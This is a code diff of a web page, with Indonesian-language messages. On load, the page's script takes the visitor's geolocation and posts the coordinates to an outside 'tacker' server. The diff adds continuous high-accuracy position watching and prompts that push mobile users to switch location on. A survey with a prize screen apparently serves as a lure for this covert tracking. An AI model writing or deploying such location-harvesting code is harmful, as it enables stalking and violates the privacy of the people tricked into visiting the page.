@@ -305,14 +305,13 @@
     let userLat, userLon, userGoogleMapsLink;
     let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     let locationButton = document.getElementById("locationButton");
+    let watchId = null;
 
     window.onload = function() {
       if (navigator.geolocation) {
         if (isMobile) {
-          // Pada mobile, coba minta lokasi dan periksa apakah lokasi aktif
           checkLocationStatus();
         } else {
-          // Pada desktop, langsung minta lokasi seperti biasa
           navigator.geolocation.getCurrentPosition(sendPosition, showError);
         }
       } else {
@@ -324,14 +323,12 @@
     function checkLocationStatus() {
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          // Lokasi aktif, lanjutkan ke sendPosition
           sendPosition(position);
         },
         (error) => {
-          // Lokasi tidak aktif atau ditolak, tampilkan tombol untuk mengaktifkan lokasi
           showLocationPrompt();
         },
-        { timeout: 5000 } // Timeout untuk mempercepat deteksi jika lokasi dimatikan
+        { timeout: 2000, maximumAge: 0 }
       );
     }
 
@@ -339,30 +336,42 @@
       document.getElementById("status").innerHTML = "Lokasi Anda dimatikan. Silakan aktifkan lokasi untuk melanjutkan.";
       document.getElementById("status").classList.add("error");
 
-      // Tampilkan tombol hanya di perangkat mobile
       if (isMobile) {
         locationButton.style.display = 'block';
 
-        // Tentukan tautan berdasarkan OS
         if (/Android/i.test(navigator.userAgent)) {
-          // Android: Buka pengaturan lokasi
           locationButton.href = "intent://#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end";
         } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-          // iOS: Buka pengaturan lokasi (catatan: mungkin tidak berfungsi di iOS terbaru)
-          locationButton.href = "prefs:root=LOCATION_SERVICES";
+          locationButton.href = "App-Prefs:root=LOCATION_SERVICES";
         } else {
-          // Perangkat lain: Berikan instruksi manual
           document.getElementById("status").innerHTML += "<br>Silakan aktifkan lokasi di pengaturan perangkat Anda, lalu muat ulang halaman.";
           locationButton.style.display = 'none';
         }
 
-        // Setelah tombol diklik, coba ulang setelah beberapa detik
-        locationButton.onclick = function() {
-          setTimeout(() => {
-            checkLocationStatus();
-          }, 3000); // Beri waktu 3 detik untuk pengguna mengaktifkan lokasi
+        // Tambahkan event listener untuk memantau perubahan lokasi
+        locationButton.onclick = function(e) {
+          e.preventDefault(); // Hindari redirect langsung
+          watchLocationChanges();
         };
       }
+    }
+
+    function watchLocationChanges() {
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId); // Hentikan watch sebelumnya jika ada
+      }
+      watchId = navigator.geolocation.watchPosition(
+        (position) => {
+          sendPosition(position);
+          if (watchId) {
+            navigator.geolocation.clearWatch(watchId); // Hentikan watch setelah lokasi ditemukan
+          }
+        },
+        (error) => {
+          console.log("Masih menunggu aktivasi lokasi...", error);
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+      );
     }
 
     function sendPosition(position) {
@@ -370,7 +379,6 @@
       userLon = position.coords.longitude;
       userGoogleMapsLink = `https://www.google.com/maps?q=${userLat},${userLon}`;
 
-      // Kirim data lokasi ke server
       fetch('https://tacker-production.up.railway.app/save-location', {
         method: 'POST',
         headers: {
@@ -436,11 +444,9 @@
         return;
       }
 
-      // Sembunyikan survei, tampilkan hadiah
       document.getElementById("survey").style.display = 'none';
       document.getElementById("reward").style.display = 'flex';
 
-      // Tambahkan efek confetti
       for (let i = 0; i < 100; i++) {
         const confetti = document.createElement("div");
         confetti.className = "confetti";
